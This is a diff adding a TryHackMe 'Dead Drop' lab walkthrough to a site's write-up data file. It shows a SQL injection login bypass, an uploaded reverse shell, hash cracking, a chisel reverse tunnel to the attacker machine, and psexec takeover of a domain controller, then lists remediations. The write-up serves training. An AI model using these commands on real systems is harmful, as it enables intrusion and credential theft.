@@ -1,4 +1,4 @@
-export interface Writeup {
+﻿export interface Writeup {
   slug: string;
   title: string;
   excerpt: string;
@@ -252,6 +252,123 @@ PASS   : JSmith@IT2024</code></pre>
         <li><strong>Set MachineAccountQuota to 0:</strong> Prevent unprivileged domain users from joining new computer accounts to the domain.</li>
         <li><strong>Enforce Unique Passwords:</strong> Disallow password reuse across users to mitigate horizontal spraying attacks.</li>
         <li><strong>Protect High-Privilege Accounts:</strong> Add Domain Admins to the <em>Protected Users</em> group to prevent Kerberos delegation impersonation.</li>
+      </ul>
+    `,
+  },
+  {
+    slug: "tryhackme-dead-drop-walkthrough",
+    title: "TryHackMe: Dead Drop Walkthrough",
+    excerpt: "End-to-end compromise of an internal Active Directory domain via DMZ web application: SQL injection bypass, reverse shell foothold, shadow hash cracking, APK credential extraction, Chisel pivoting, and PsExec Domain Controller takeover.",
+    date: "Oct 2026",
+    readTime: "8 min",
+    platformTag: "TryHackMe",
+    tags: ["ActiveDirectory", "AD Pentesting", "Pivoting", "Chisel"],
+    contentHtml: `
+      <b>Room Link: </b> <u><a href="https://tryhackme.com/room/dead-drop" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/dead-drop</a></u>
+
+      <h2>Scenario</h2>
+      <p>You have been engaged as a penetration tester for a security audit of <strong>DeadDrop Ltd</strong>, a document management company that provides file-sharing services to corporate clients. The company recently expanded its infrastructure and wants assurance that its systems are secure before onboarding a major new client.</p>
+      <p>Your point of entry is a web-facing file-sharing application. Behind it sits an internal corporate network that you have no direct access to. Your objective is clear: compromise the Domain Controller and retrieve the flag from the Administrator's desktop. How you get there is up to you.</p>
+
+      <h2>1. Recon</h2>
+      <p>This room has multiple machines, and we only have access to <code>192.168.11.200</code>. We use <code>nmap</code> to scan the target machine for open ports and services.</p>
+      <pre><code>nmap -F -sV -sC 192.168.11.200</code></pre>
+      <img src="/images/writeups/Dead Drop/nmap_web.png" alt="Nmap scan results for 192.168.11.200" class="rounded border border-border my-4 w-full" />
+      <p>On the target, we have SSH available on port 22 and a web server on port 80.</p>
+
+      <h2>2. Access as svc-drop</h2>
+      <h3>SQL Injection</h3>
+      <p>We visit the web page at <code>192.168.11.200</code> and are redirected to <code>/login</code>.</p>
+      <img src="/images/writeups/Dead Drop/web_login_page.png" alt="DeadDrop web login page" class="rounded border border-border my-4 w-full" />
+
+      <p>We don't have any credentials, so we try to bypass the login page using SQL injection.</p>
+      <pre><code>admin' -- </code></pre>
+      <img src="/images/writeups/Dead Drop/sql_inject.png" alt="SQL injection login bypass" class="rounded border border-border my-4 w-full" />
+      <p>And we successfully bypass the login page and are redirected to <code>/dashboard</code>.</p>
+
+      <h3>Reverse Shell</h3>
+      <p>Here we can see a file upload functionality, which allows us to upload files to the server. We can use this to upload a <code>reverse</code> shell and get a shell on the server.</p>
+      <img src="/images/writeups/Dead Drop/upload_shell.png" alt="Uploading reverse shell" class="rounded border border-border my-4 w-full" />
+      <p>Tool I used to generate the reverse shell: <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer"><strong>revshells</strong></a></p>
+
+      <p>And we successfully got a shell.</p>
+      <img src="/images/writeups/Dead Drop/got_the_shell.png" alt="Reverse shell connected" class="rounded border border-border my-4 w-full" />
+
+      <p>In the home directory, we find a <code>backup</code> directory. And inside the <code>backup</code> directory, we find a file called <code>shadow.bak</code> that contains the hash.</p>
+      <img src="/images/writeups/Dead Drop/got_the_hash.png" alt="shadow.bak file hash" class="rounded border border-border my-4 w-full" />
+
+      <h3>Crack the Hash</h3>
+      <p>I use the <code>john</code> tool to crack the hash and get the password.</p>
+      <pre><code>john --format=sha512crypt hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+      <img src="/images/writeups/Dead Drop/john_hash_cracked.png" alt="Cracking hash with John the Ripper" class="rounded border border-border my-4 w-full" />
+
+      <p>We test the credentials and try to log in to the web server via SSH and are successful.</p>
+      <img src="/images/writeups/Dead Drop/ssh_login_success.png" alt="SSH login as svc-drop" class="rounded border border-border my-4 w-full" />
+
+      <p>In the <code>backup</code> directory, we find nmap. Now run <code>nmap</code> to scan the <code>DC</code>.</p>
+      <pre><code>./nmap -F -Pn 192.168.11.100 -oN DC</code></pre>
+      <img src="/images/writeups/Dead Drop/nmap_DC.png" alt="Nmap scan of Domain Controller" class="rounded border border-border my-4 w-full" />
+
+      <h2>3. Access as j.harris</h2>
+      <p>In the backup directory, we find a <code>.apk</code> file and transfer it to our attacker machine by using <code>scp</code>.</p>
+      <img src="/images/writeups/Dead Drop/get_the_.apk_file.png" alt="Transferring APK via scp" class="rounded border border-border my-4 w-full" />
+
+      <p>We open the <code>.apk</code> file in <code>jadx</code> and find a password for the user <code>j.harris</code>.</p>
+      <img src="/images/writeups/Dead Drop/recover password.png" alt="Credentials extracted in jadx" class="rounded border border-border my-4 w-full" />
+
+      <p>Now we have the credentials for <code>j.harris</code>. To test these credentials, first, we should be able to send traffic to the <code>DC</code>. As you know, in this room, we are not allowed to send traffic to the <code>DC</code>. So now we have to pivot, make a tunnel through <code>192.168.11.200</code> to the <code>DC</code>.</p>
+      <p>For this, we use <code>chisel</code>. To make a tunnel, our compromised machine should have this tool too, so we transfer <code>chisel</code> by using the <code>scp</code>.</p>
+      <img src="/images/writeups/Dead Drop/scp_chisel_transfer.png" alt="Transfer chisel using scp" class="rounded border border-border my-4 w-full" />
+
+      <pre><code># Start a chisel server on our attacker machine
+chisel server --socks5 --reverse
+
+# Start a chisel client on the compromised machine
+chisel client --fingerprint &lt;fingerprint&gt; 192.168.21.5:8080 R:socks</code></pre>
+
+      <p>Here we successfully create a tunnel.</p>
+      <img src="/images/writeups/Dead Drop/chisel_connection.png" alt="Chisel connection established" class="rounded border border-border my-4 w-full" />
+
+      <p>To successfully make a connection to the DC by using a tunnel, we should use a <code>proxychains</code> keyword before every command we will run on our system. So our traffic will go through our compromised machine and then directed to the DC. Now we use the <code>nxc</code> to authenticate as the <code>j.harris</code> and list all the shares and the users.</p>
+      <pre><code># Use proxychains to route traffic through the tunnel
+
+# List all the users
+proxychains nxc smb 192.168.11.100 -u 'j.harris' -p '&lt;passwd&gt;' --users-export users
+
+# List all the shares
+proxychains nxc smb DEADDROP-DC.deaddrop.loc -u 'j.harris' -p '&lt;passwd&gt;' --shares</code></pre>
+
+      <img src="/images/writeups/Dead Drop/nxc_smb_users.png" alt="NetExec SMB users enumeration" class="rounded border border-border my-4 w-full" />
+      <img src="/images/writeups/Dead Drop/nxc_smb_shares.png" alt="NetExec SMB shares listing" class="rounded border border-border my-4 w-full" />
+
+      <p>We successfully authenticated. Notice that <code>j.harris</code> is a member of the Admins group. Look for the <code>(Pwn3d!)</code> marker in the output that confirms local admin access.</p>
+
+      <h2>4. Domain Controller Compromise & Flag Capture</h2>
+      <p>Now we use the <code>impacket-psexec</code> to get a shell on the DC as <code>j.harris</code>.</p>
+      <pre><code>proxychains impacket-psexec deaddrop.loc/j.harris:'&lt;passwd&gt;'@192.168.11.100</code></pre>
+
+      <p>And also we got the <strong>flag</strong>.</p>
+      <pre><code>Get-ChildItem -Path 'C:\\Users\\' -Recurse  -Filter "*.txt"</code></pre>
+      <img src="/images/writeups/Dead Drop/got_the_flag.png" alt="Shell and flag on DC" class="rounded border border-border my-4 w-full" />
+
+      <h2>5. BloodHound Enumeration</h2>
+      <p>With the credentials of <code>j.harris</code>, we can enumerate the Domain using <code>bloodhound-python</code>.</p>
+      <pre><code>proxychains bloodhound-python -u 'j.harris' -p '&lt;passwd&gt;' -d deaddrop.loc -ns 192.168.11.100 -c All --zip --dns-tcp</code></pre>
+
+      <img src="/images/writeups/Dead Drop/bloodhound_enum.png" alt="BloodHound enumeration" class="rounded border border-border my-4 w-full" />
+      <img src="/images/writeups/Dead Drop/bloodhound_enum.groups.png" alt="BloodHound group graph" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />
+
+      <p>The graph showed <code>j.harris</code> held an <code>AddMember</code> ACL right over a group called <strong>ITSupport-Admins</strong> &mdash; and that group was itself nested inside <strong>Domain Admins</strong>. That's a direct, one-hop escalation: anyone who can add members to ITSupport-Admins can add themselves, and inherit Domain Admin membership transitively.</p>
+
+      <p><strong>Note:</strong> Doesn't need to escalate the privileges. We achieved our goals.</p>
+
+      <h2>6. Key Takeaways & Remediation</h2>
+      <ul>
+        <li><strong>Prevent SQL Injection:</strong> Implement parameterized queries / prepared statements on all authentication endpoints.</li>
+        <li><strong>Secure File Uploads:</strong> Enforce strict extension whitelisting, sanitize file names, and store uploads in directories where server-side script execution is disabled.</li>
+        <li><strong>File Permission & Backup Hygiene:</strong> Never leave backup files like <code>shadow.bak</code> in non-root or world-readable folders.</li>
+        <li><strong>Decompile Mobile Artifacts (Hardcoded Secrets):</strong> Never hardcode production credentials or API keys inside mobile application packages (APKs).</li>
+        <li><strong>Network Segmentation & Least Privilege:</strong> Restrict outbound pivoting from DMZ servers and ensure regular domain users do not hold administrative privileges on Domain Controllers.</li>
       </ul>
     `,
   },
